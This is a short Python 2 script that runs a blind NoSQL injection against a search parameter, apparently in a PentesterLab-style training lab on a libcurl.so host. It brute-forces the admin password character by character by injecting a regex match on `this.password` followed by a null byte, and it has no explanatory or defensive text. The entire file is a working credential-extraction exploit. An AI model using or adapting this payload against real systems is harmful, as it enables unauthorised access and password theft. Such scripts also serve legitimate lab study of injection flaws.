import requests
import string
import sys

passwd = ''
base = ''

end = False
alpha = string.lowercase + string.digits + '-'
while len(passwd) < 36 and not end:
    for i in alpha:
        try:
            response = requests.get('http://' + base + '.libcurl.so/?search=admin%27%20%26%26%20this.password.match(/^' + passwd + i + '.*$/)%00')
            if "search=admin" in response.text:
                passwd = passwd + i
                sys.stdout.write(i)
                sys.stdout.flush()
                break
            elif i == '-':
                end = True
                print "Not found"
        except KeyboardInterrupt:
            print passwd + "-" + i
